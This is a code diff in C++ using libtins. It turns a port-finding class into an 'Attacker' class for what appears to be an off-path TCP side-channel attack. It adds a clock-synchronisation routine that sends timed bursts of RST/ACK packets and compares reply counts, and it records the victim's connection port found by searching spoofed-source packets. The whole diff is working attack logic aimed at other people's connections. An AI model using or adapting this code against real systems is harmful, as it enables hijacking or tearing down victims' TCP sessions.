@@ -1,4 +1,4 @@
-#include "port_finder.h"
+#include "attacker.h"
 
 #include <vector>
 #include <thread>
@@ -10,18 +10,62 @@
 using namespace std;
 using namespace Tins;
 
-PortFinder::PortFinder(
+Attacker::Attacker(
         ConnectionID legitConn,
         uint32_t legitLastSeq,
         const string& victimIP) : 
     legitConn_(legitConn), legitLastSeq_(legitLastSeq), victimIP_(victimIP) {}
 
+chrono::milliseconds Attacker::synchronizeClock() {
+    Tins::PacketSender sender;
+    
+    auto pkt = make_packet(legitConn_, "RA", legitLastSeq_ + 3);    
+    auto pcounter = PacketCounter::instance();
 
-void PortFinder::setSyncDelayMs(chrono::milliseconds syncDelayMs) {
-    syncDelayMs_ = syncDelayMs;
+    uint32_t n1, n2;
+    {
+        cout << "Sending out 200 packets in 1 sec..." << endl;
+        pcounter->startCounting();
+        auto s = align_and_delay(0ms);
+        for (int i = 0; i < 200; i++) {
+            sender.send(pkt);
+            s += 5ms;
+            this_thread::sleep_until(system_clock::time_point(s));
+        }
+        this_thread::sleep_for(2s);
+        n1 = pcounter->stopCounting();
+        cout << "n1 = " << n1 << endl;
+    }
+
+    {
+        cout << "Sending out 200 packets in 1 sec and 5ms delay..." << endl;
+        pcounter->startCounting();
+        auto s = align_and_delay(5ms);
+        for (int i = 0; i < 200; i++) {
+            sender.send(pkt);
+            s += 5ms;
+            this_thread::sleep_until(system_clock::time_point(s));
+        }
+        this_thread::sleep_for(2s);
+        n2 = pcounter->stopCounting();
+        cout << "n2 = " << n2 << endl;
+    }
+
+    uint32_t delay_ms = 0;
+    if (n1 == 100) {
+        delay_ms = 0;
+    } else if (n2 == 100) {
+        delay_ms = 5;
+    } else if (n1 > n2) {
+        delay_ms = 5 + (n2 - 100) * 1000 / 200;
+    } else {
+        delay_ms = 5 + (300 - n2) * 1000 / 200;
+    }
+    syncDelayMs_ = milliseconds(delay_ms);
+    return syncDelayMs_;
 }
 
-uint32_t PortFinder::find(uint32_t from, uint32_t to) {
+uint32_t Attacker::find_port(uint32_t from, uint32_t to) {
     int range = 5000;
     auto start = from;
     cout << "Linear search" << endl;
@@ -52,10 +96,11 @@ uint32_t PortFinder::find(uint32_t from, uint32_t to) {
             right = mid - 1;
         }
     }
+    victimPort_ = left;
     return left;
 }
 
-bool PortFinder::has_port(uint32_t from, uint32_t to) {
+bool Attacker::has_port(uint32_t from, uint32_t to) {
     vector<IP> packets;
     ConnectionID victimConn(victimIP_, 0, legitConn_.serverIP, legitConn_.serverPort);
     for (auto port = from; port <= to; port++) {
